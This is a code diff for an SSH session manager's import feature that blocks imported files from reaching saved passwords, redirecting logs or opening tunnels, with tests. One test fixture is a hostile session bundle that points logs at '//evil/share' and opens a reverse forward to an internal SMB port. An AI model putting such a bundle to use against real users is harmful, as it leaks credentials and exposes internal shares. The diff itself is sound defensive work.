@@ -46,6 +46,8 @@ pub fn apply_with_passwords(
     result: &ImportResult,
 ) -> Option<(Id, Vec<PendingPassword<Id>>)> {
     let root = config.add_folder(None, &format!("Imported from {}", result.source))?;
+    // Sessions with no login of their own stop here, short of any saved one above.
+    config.overrides_mut(root)?.identity = Some(0);
     let mut folders: HashMap<Vec<String>, Id> = HashMap::new();
     let mut identities: HashMap<(String, String, String), Id> = HashMap::new();
     let mut passwords = Vec::new();
@@ -921,6 +923,8 @@ pub struct BundleImport {
     pub folder: Id,
     pub sessions: usize,
     pub new_logins: usize,
+    /// Port forwards the file asked for, which were left out.
+    pub removed_forwards: usize,
 }
 
 /// Adds a bundle under a new folder, with fresh ids. Nothing existing changes, and
@@ -943,7 +947,12 @@ pub fn import_bundle(config: &mut Config, text: &str) -> Result<BundleImport, St
         let existing = config
             .identities
             .iter()
-            .find(|i| i.username == identity.username && i.key_file == identity.key_file)
+            // Never one with a saved password, which the file's hosts would then receive.
+            .find(|i| {
+                i.username == identity.username
+                    && i.key_file == identity.key_file
+                    && !i.has_password
+            })
             .map(|i| i.id);
         let id = existing.unwrap_or_else(|| {
             new_logins += 1;
@@ -965,11 +974,21 @@ pub fn import_bundle(config: &mut Config, text: &str) -> Result<BundleImport, St
             };
         }
     };
+    // A file does not get to choose where output is written, or to open tunnels.
+    let mut removed_forwards = 0;
+    let mut strip = |o: &mut Overrides| {
+        o.log_dir = None;
+        if let Some(forwards) = o.port_forwards.take() {
+            removed_forwards += forwards.len();
+        }
+    };
     remap(&mut bundle.settings);
+    strip(&mut bundle.settings);
     let mut sessions = 0;
     let mut fresh = Vec::new();
     walk_nodes(&mut bundle.nodes, &mut |node| {
         remap(node_settings(node));
+        strip(node_settings(node));
         if matches!(node, Node::Session(_)) {
             sessions += 1;
         }
@@ -988,6 +1007,8 @@ pub fn import_bundle(config: &mut Config, text: &str) -> Result<BundleImport, St
         .ok_or("could not add a folder")?;
     if let Some(Node::Folder(target)) = config.find_mut(folder) {
         target.settings = bundle.settings;
+        // Sessions the file gave no login stop here, short of any saved one above.
+        target.settings.identity.get_or_insert(0);
         target.snippets = bundle.snippets;
         target.children = bundle.nodes;
     }
@@ -995,6 +1016,7 @@ pub fn import_bundle(config: &mut Config, text: &str) -> Result<BundleImport, St
         folder,
         sessions,
         new_logins,
+        removed_forwards,
     })
 }
 
@@ -1184,9 +1206,10 @@ mod bundle_tests {
         let mut dest = source.clone();
         let (before_sw, before_ids) = (find(&dest, "sw1").unwrap(), dest.identities.len());
         let before = dest.nodes.clone();
+        // The login with a saved password stays out of it, so the file gets its own.
         let result = import_bundle(&mut dest, &text).unwrap();
-        assert_eq!(result.new_logins, 0);
-        assert_eq!(dest.identities.len(), before_ids);
+        assert_eq!(result.new_logins, 1);
+        assert_eq!(dest.identities.len(), before_ids + 1);
         assert_eq!(&dest.nodes[..before.len()], &before[..]);
         assert_eq!(
             find(&dest, "sw1"),
@@ -1202,6 +1225,19 @@ mod bundle_tests {
         assert_eq!(ids.len(), count);
         // A fresh id never collides with imported ones.
         assert!(!ids.contains(&dest.add_folder(None, "later").unwrap()));
+    }
+
+    #[test]
+    fn a_matching_login_with_no_saved_password_is_shared() {
+        let (mut source, ..) = sample();
+        for identity in &mut source.identities {
+            identity.has_password = false;
+        }
+        let text = export_bundle(&source, None, true).unwrap();
+        let mut dest = source.clone();
+        let before = dest.identities.len();
+        assert_eq!(import_bundle(&mut dest, &text).unwrap().new_logins, 0);
+        assert_eq!(dest.identities.len(), before);
     }
 
     #[test]
@@ -1444,6 +1480,104 @@ D:\"[SSH2] Port\"=00000016\r\nS:\"Password V2\"=02:deadbeef\r\nS:\"Identity File
         assert_eq!(sw.encrypted_password, "02:deadbeef");
         assert_eq!(shared.encrypted_password, "02:credentialsecret");
         assert_eq!(shared.credential, "lab login");
+    }
+
+    const HOSTILE_BUNDLE: &str = r#"format = "linecon-sessions-1"
+
+[settings]
+log_dir = "//evil/share"
+
+[[identities]]
+id = 1
+name = "x"
+username = "admin"
+
+[[nodes]]
+kind = "session"
+id = 2
+name = "evil"
+[nodes.target]
+protocol = "ssh"
+host = "evil.example"
+[nodes.settings]
+identity = 1
+log_dir = "//evil/share"
+port_forwards = ["R9000 fileserver.local:445"]
+
+[[nodes]]
+kind = "session"
+id = 3
+name = "no-login"
+[nodes.target]
+protocol = "ssh"
+host = "other.example"
+"#;
+
+    fn imported_session(config: &Config, name: &str) -> Id {
+        fn find(nodes: &[Node], name: &str) -> Option<Id> {
+            nodes.iter().find_map(|node| match node {
+                Node::Session(session) if session.name == name => Some(session.id),
+                Node::Session(_) => None,
+                Node::Folder(folder) => find(&folder.children, name),
+            })
+        }
+        find(&config.nodes, name).expect("imported")
+    }
+
+    /// Saved passwords must never be attached to someone else's hosts by a file.
+    #[test]
+    fn a_bundle_cannot_reach_a_saved_password() {
+        let mut config = Config::default();
+        let mine = config.add_identity("mine", "admin");
+        config.identity_mut(mine).unwrap().has_password = true;
+        let global = config.add_identity("global", "root");
+        config.identity_mut(global).unwrap().has_password = true;
+        config.settings.identity = Some(global);
+        import_bundle(&mut config, HOSTILE_BUNDLE).unwrap();
+        for name in ["evil", "no-login"] {
+            let id = imported_session(&config, name);
+            let resolved = config.resolve(id).unwrap();
+            let login = resolved.identity(&config);
+            assert!(
+                login.is_none_or(|i| !i.has_password),
+                "{name} reaches a saved password through {login:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_bundle_cannot_bring_in_forwards_or_a_log_folder() {
+        let mut config = Config::default();
+        let result = import_bundle(&mut config, HOSTILE_BUNDLE).unwrap();
+        let id = imported_session(&config, "evil");
+        let resolved = config.resolve(id).unwrap();
+        assert!(resolved.port_forwards.value.is_empty());
+        assert_ne!(resolved.log_dir.value, "//evil/share");
+        let _ = result;
+    }
+
+    /// Imported sessions with no login of their own must not pick up a saved one.
+    #[test]
+    fn imported_sessions_do_not_inherit_a_saved_login() {
+        let mut config = Config::default();
+        let global = config.add_identity("global", "root");
+        config.identity_mut(global).unwrap().has_password = true;
+        config.settings.identity = Some(global);
+        let result = ImportResult {
+            source: "OpenSSH".to_string(),
+            sessions: vec![Imported {
+                name: "h".to_string(),
+                target: Target {
+                    host: "h".to_string(),
+                    ..Default::default()
+                },
+                ..Default::default()
+            }],
+            skipped: 0,
+        };
+        apply(&mut config, &result).unwrap();
+        let resolved = config.resolve(imported_session(&config, "h")).unwrap();
+        assert!(resolved.identity(&config).is_none());
     }
 
     /// A password goes only to the session it was saved for, unless its owner shared it
